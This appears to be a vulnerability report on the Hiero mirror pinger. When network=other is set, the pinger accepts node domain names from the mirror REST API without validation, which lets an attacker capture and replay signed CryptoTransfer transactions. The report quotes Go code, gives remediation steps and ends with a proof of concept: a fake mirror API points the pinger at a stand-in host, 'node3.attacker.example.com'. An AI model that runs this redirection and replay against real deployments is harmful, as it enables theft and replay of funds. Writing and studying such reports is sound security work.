### Title
Unauthenticated DNS-Controlled gRPC Endpoint Injection via Mirror REST API in `network=other` Mode

### Summary
When `cfg.network` is `"other"`, `newClient()` calls `buildNetworkFromMirrorNodes()`, which fetches node entries from the operator-configured mirror REST API and blindly promotes every `serviceEndpoint.DomainName` value into the Hiero SDK's network map without any allowlist, IP-range, or identity validation. Because the Hiero SDK resolves these hostnames at connection time via the system DNS resolver, an attacker who controls the DNS record for any such domain name can redirect all pinger gRPC traffic — including signed `CryptoTransfer` transactions — to an attacker-controlled server. The signed transactions can then be replayed against the real network.

### Finding Description

**Exact code path:**

`pinger/sdk_client.go` lines 17–22 — when `cfg.network == "other"`, the client is built exclusively from the mirror API response: [1](#0-0) 

`pinger/mirror_node_client.go` lines 113–124 — `fetchMirrorNodeNetwork()` iterates every `ServiceEndpoint`, takes `ep.DomainName` verbatim (falling back to `ep.IPAddressV4`), and inserts `host:port` into the network map with no validation: [2](#0-1) 

The resulting map is passed directly to `hiero.ClientForNetwork(netmap)`: [3](#0-2) 

**Root cause and failed assumption:**

The code assumes that every `DomainName` value returned by the mirror REST API resolves to a legitimate consensus node. There is no:
- Allowlist of expected hostnames or IP ranges
- Comparison against a pinned node address book
- TLS certificate pinning to known node public keys (the Hiero SDK for custom networks uses standard TLS hostname validation only, not node-identity pinning)

**Exploit flow:**

1. The mirror REST API (e.g., `http://mirror-rest:5551` — note HTTP, not HTTPS, per the default config example) returns a node entry whose `service_endpoints[].domain_name` is `node1.example-custom-net.com`.
2. The attacker controls the DNS zone for `example-custom-net.com` (or poisons the resolver's cache for that name).
3. The attacker points `node1.example-custom-net.com` to their own server and presents a valid TLS certificate for it (obtainable via Let's Encrypt if they own the domain, or via any public CA).
4. `hiero.ClientForNetwork(netmap)` resolves the hostname at gRPC dial time and connects to the attacker's server.
5. `submitWithRetry()` in `pinger/transfer.go` executes `CryptoTransfer.Execute(client)`, sending a fully signed transaction to the attacker's gRPC endpoint. [4](#0-3) 

**Why existing checks are insufficient:**

The only checks present are:
- `host == ""` or `ep.Port == 0` → skip (line 118–120): does not validate the *value* of the domain name
- HTTP status code check (lines 90–93): only rejects non-2xx responses from the mirror API, not tampered content [5](#0-4) 

### Impact Explanation

Every signed `CryptoTransfer` transaction is delivered to the attacker's gRPC server. The attacker obtains:
- **Transaction interception**: full plaintext of each transfer (sender, receiver, amount, memo, transaction ID).
- **Replay attack**: the signed transaction is valid on the real network until its `transactionValidDuration` expires (default 120 s). The attacker can submit it to the real network, causing double-spend or repeated fund movement.
- **Operator key exposure risk**: repeated signed transactions allow offline analysis of signing patterns.
- **Availability impact**: the pinger reports all transfers as failed (attacker returns errors), breaking liveness monitoring.

Severity: **High** — signed financial transactions are exfiltrated and replayable.

### Likelihood Explanation

The attack is scoped to `network=other` deployments (custom/private Hedera networks). In such deployments:
- Domain names in the node address book are often internal or custom, potentially in zones controlled by parties other than the network operator.
- If the mirror REST API is served over plain HTTP (the documented default example is `http://mirror-rest:5551`), an on-path attacker can inject arbitrary domain names without needing DNS control at all — a strictly easier variant.
- DNS cache poisoning (e.g., Kaminsky-style) against an unvalidated resolver is a well-understood, repeatable technique requiring no privileged access.
- Obtaining a TLS certificate for a domain one controls is trivially free via Let's Encrypt. [6](#0-5) 

### Recommendation

1. **Pin the mirror REST API to HTTPS**: reject any `cfg.mirrorRest` URL that does not use `https://` when `network=other`.
2. **Validate returned domain names against an operator-supplied allowlist**: add a `cfg.allowedNodeHosts []string` (CIDR ranges or exact FQDNs) and reject any `DomainName`/`IPAddressV4` not matching.
3. **Use TLS with node-identity pinning**: configure the Hiero SDK client with the expected node TLS certificates or public keys rather than relying solely on hostname-based TLS validation.
4. **Alternatively, prefer `IPAddressV4` over `DomainName`**: if IP addresses are used instead of hostnames, DNS hijacking is eliminated; DNS names should be resolved once and validated against expected IP ranges.

### Proof of Concept

```
# Preconditions:
# - Pinger deployed with HIERO_MIRROR_PINGER_NETWORK=other
# - HIERO_MIRROR_PINGER_REST=http://attacker-controlled-mirror:5551
#   OR attacker can DNS-poison the resolver for a domain in the mirror API response

# Step 1: Stand up a fake mirror REST API returning attacker domain
cat > /tmp/nodes.json <<'EOF'
{
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{
      "domain_name": "node3.attacker.example.com",
      "ip_address_v4": "",
      "port": 50211
    }]
  }],
  "links": {"next": null}
}
EOF
python3 -m http.server 5551 &   # serves nodes.json at /api/v1/network/nodes

# Step 2: Point node3.attacker.example.com to attacker gRPC server
# (attacker owns attacker.example.com, gets Let's Encrypt cert)
# Run attacker gRPC server that logs and optionally replays received transactions

# Step 3: Start pinger
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://127.0.0.1:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.1234 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
./pinger

# Result: all CryptoTransfer transactions are sent to node3.attacker.example.com:50211
# Attacker receives fully signed transactions and can replay them against the real network.
```

### Citations

**File:** pinger/sdk_client.go (L17-22)
```go
	case "other":
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)
```

**File:** pinger/mirror_node_client.go (L90-93)
```go
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		retry := resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode >= 500
		return nil, retry, fmt.Errorf("GET %s returned %s", url, resp.Status)
	}
```

**File:** pinger/mirror_node_client.go (L113-124)
```go
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/transfer.go (L29-33)
```go
		cryptoTransfer := hiero.NewTransferTransaction().
			AddHbarTransfer(client.GetOperatorAccountID(), hiero.HbarFromTinybar(-cfg.amountTinybar)).
			AddHbarTransfer(toID, hiero.HbarFromTinybar(cfg.amountTinybar))

		resp, err := cryptoTransfer.Execute(client)
```

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```
